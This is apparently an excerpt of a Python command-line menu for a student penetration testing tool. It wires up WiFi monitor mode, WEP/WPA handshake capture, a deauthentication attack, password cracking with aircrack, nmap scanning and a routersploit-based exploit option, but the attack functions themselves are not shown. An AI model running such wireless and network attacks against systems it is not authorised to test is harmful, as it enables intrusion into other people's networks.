print("                             \033[1;3m\033[36mMade by: Nhat, Nhan, Quan, Tam\033[0m")

def main_menu():
    try:
        while True:
            print("\n\033[1m.---------- MAIN MENU -----------.")
            print("\033[32m.--------------------------------.")
            print("|\033[37m 1. Wireless Network \033[32m           |")
            print("|\033[37m 2. Scan Information  \033[32m          |")
            print("|\033[37m 3. Exploit            \033[32m         |")
            print("|\033[37m 4. Report              \033[32m        |")
            print("|\033[37m 5. Exit                  \033[32m      |")
            print(".________________________________.\033[0m")
            choice0 = input("\n\033[1mChoose a number: ")
            if choice0 == "1":
                global airodump_process
                while True:
                    print("\033[1m\n.----------------\033[1m WIRELESS NETWORK ------------------.")
                    print("\033[32m.----------------------------------------------------.")
                    print("|\033[37m 1. Start Monitor Mode \033[32m                             |")
                    print("|\033[37m 2. Scan Wireless Network(Ctrl + C to Stop)         \033[32m|")
                    print("|\033[37m 3. WEP           \033[32m                                  |")
                    print("|\033[37m 4. WPA/ WPA2          \033[32m                             |")
                    print("|\033[37m 5. Back To Main Menu     \033[32m                          |")
                    print(".____________________________________________________.\033[0m")
                    choiceWifi = input("\n\033[1mChoose a number: \033[1m")
                    if choiceWifi == "1":

                        for i in range(11):
                            interface = f'wlan{i}'
                            selected_interface = start_monitor_mode(interface)
                            if selected_interface:
                                break
                            else:
                                print("\n\033[31m\033[1;3mInvalid interface.\033[0m")
                    elif choiceWifi == "2":
                        press_a_twice()
                        if 'selected_interface' not in locals():
                            print("\n\033[31mPlease select an interface.")
                        else:
                            capture_traffic(selected_interface)

                    elif choiceWifi == "3":
                        while True:
                            print("\n\033[1m.----------- WEP ------------.")
                            print("\033[32m.----------------------------.")
                            print("|\033[37m 1. Capture Handshake\033[32m       |")
                            print("|\033[37m 2. Brute WEP\033[32m               |")
                            print("|\033[37m 3. Back To Wireless Menu\033[32m   |")
                            print(".____________________________.")
                            choiceWEP = input("\n\033[0m\033[1mChoose a number: ")
                            if choiceWEP == "1":
                                bssid = input("Enter BSSID: ")
                                channel = input("Enter Channel: ")
                                file_name = input("Enter File Name: ")
                                brute_wep(bssid, channel, file_name)
                            elif choiceWEP == "2":
                                file_name = input("Enter File Name: ")
                                crack_wep(file_name)
                            elif choiceWEP == "3":
                                break
                            else:
                                print("\n\033[31m\033[1;3mInvalid choice.\033[0m")
                    elif choiceWifi == "4":
                        while True:
                            print("\n\033[1m.--------------- WPA/ WPA2 ---------------.")
                            print("\033[32m.-----------------------------------------.")
                            print("|\033[37m 1. Capture Handshake \033[32m                   |")
                            print("|\033[37m 2. Deauth aireplay attack  \033[32m             |")
                            print("|\033[37m 3. Brute WPA/WPA2            \033[32m           |")
                            print("|\033[37m 4. Back To Wireless Network Menu\033[32m        |")
                            print("._________________________________________.\033[0m")
                            choiceWPA = input("\n\033[1mChoose a number: ")
                            if choiceWPA == "1":
                                run_airodump()
                            elif choiceWPA == "2":
                                run_aireplay()
                            elif choiceWPA == "3":
                                run_aircrack()
                            elif choiceWPA == '4':
                                break  # Thoát ra khỏi vòng lặp con và quay lại menu số 1
                            else:
                                print("\n\033[31m\033[1;3mInvalid choice.\033[0m")
                    elif choiceWifi == "5":
                        break
                    else:
                        print("\n\033[31m\033[1;3mInvalid choice.\033[0m")
            elif choice0 == "2":
                while True:
                # Thực hiện các tùy chọn trong menu số 2
                    print("\n\033[1m.------------ SCANNING -------------.")
                    print("\033[32m.-----------------------------------.")
                    print("|\033[37m 1. Scan Multiple Subnets \033[32m         |")
                    print("|\033[37m 2. Scan Service  \033[32m                 |")
                    print("|\033[37m 3. Back To Main Menu     \033[32m         |")
                    print(".___________________________________.\033[0m")
                    choice2 = input("\n\033[1mChoose a number: ")
                    if choice2 == '1':
                        subnets = input("Enter the target subnets (192.168.1.0/24 or 192.168.0-255.0): ").split(",")
                        append_to_file('subnets_input', subnets,'data.py')
                        active_hosts = []  # Khởi tạo danh sách các máy chủ hoạt động ở đây
                        for subnet in subnets:
                            print(f"Scanning subnet: {subnet.strip()}")
                            result = host_discovery(subnet.strip())
                            if result:
                                print("\n\033[33mActive hosts:\033[0m\033[1m")
                                for host in result:
                                    active_hosts.append(host)
                                    print(host, "\033[36mis up\033[0m\033[1m")
                            else:
                                print("No active hosts found.")
                            print("\n")
                        append_to_file('host_up', active_hosts, 'data.py')

                    elif choice2 == '2':
                            target = input("Enter the target IP or hostname to scan: ")
                            append_to_file('ip_scan_service', target,'data.py')
                            all_ports = input("Do you want to scan all 65535 ports? (yes/no): ").strip().lower()
                            if all_ports == "yes":
                                run_nmap_scan(target, all_ports=True)
                            else:
                                nmap_result= run_nmap_scan(target)
                                if nmap_result is not None:
                                    append_to_file('nmap_result', nmap_result, 'data.py')
                    elif choice2 == '3':
                        # Quay lại menu số 1
                        break
                    else:
                        print("Error")
            elif choice0 == "3":
                exploit()            
            elif choice0 == "4":
                
                while True:
                # Thực hiện các tùy chọn trong menu
                    print("\n\033[1m.-------- REPORT ---------.")
                    print("\033[32m.-------------------------.")
                    print("|\033[37m 1. HTML \033[32m                |")
                    print("|\033[37m 2. PDF  \033[32m                |")
                    print("|\033[37m 3. Back To Main Menu  \033[32m  |")
                    print("\033[32m.-------------------------.\033[0m")
                    choice4 = input("\n\033[1mChoose a type to export: ")
                    if choice4 == "1":
                        file_path = "/home/kali/Desktop/REPORT/index.html"
                            # Mở tệp HTML trong trình duyệt mặc định
                        webbrowser.open("file://" + file_path)
                    elif choice4 == "2":
                        create_report()
                    elif choice4 == "3":
                        break
                    else:
                        print("\n\033[31m\033[1;3mInvalid choice. Please select a valid option.\033[0m")

            elif choice0 == '5':
                print("\n\033[33m\033[1;3mPenNet Tool Has Stopped!")
                break
            else:
                print("\n\033[31m\033[1;3mInvalid choice. Please select a valid option.\033[0m")
    except KeyboardInterrupt:
        print("\n\n\033[33m\033[1;3mBye bye!")

def install_packages():
    try:
        subprocess.run(["sudo", "pip", "install", "python-nmap"], check=True)
        subprocess.run(["sudo", "apt", "install", "routersploit"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"\033[31mInstallation encountered an error.: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Penetration Testing Menu")
    parser.add_argument("-i", "--install", action="store_true", help="Install required packages")

    subparsers = parser.add_subparsers(dest="command")

    # Subparser for hacking WiFi
    wifi_parser = subparsers.add_parser("hack-wifi", help="Hacking WiFi options")
    wifi_parser.add_argument("--start-monitor", action="store_true", help="Start monitor mode")
    wifi_parser.add_argument("--scan-wifi", action="store_true", help="Scan WiFi networks")
    wifi_parser.add_argument("--capture-handshake", action="store_true", help="Capture WiFi handshake")
    wifi_parser.add_argument("--crack-wifi", action="store_true", help="Crack WiFi password")

    # Subparser for network scanning
    scan_parser = subparsers.add_parser("scan-network", help="Network scanning options")
    scan_parser.add_argument("--scan-subnets", action="store_true", help="Scan multiple subnets")
    scan_parser.add_argument("--scan-service", action="store_true", help="Scan a specific service")

    args = parser.parse_args()

    if args.command == "hack-wifi":
        if args.start_monitor:
            start_airmon()
        elif args.scan_wifi:
            scan_airodump()
        elif args.capture_handshake:
            run_airodump()
        elif args.crack_wifi:
            run_aircrack()
    elif args.command == "scan-network":
        if args.scan_subnets:
            # Handle subnet scanning
            pass
        elif args.scan_service:
            # Handle service scanning
            pass
    else:
        if args.install:
            install_packages()
            sys.exit(0)
        else:
            main_menu()
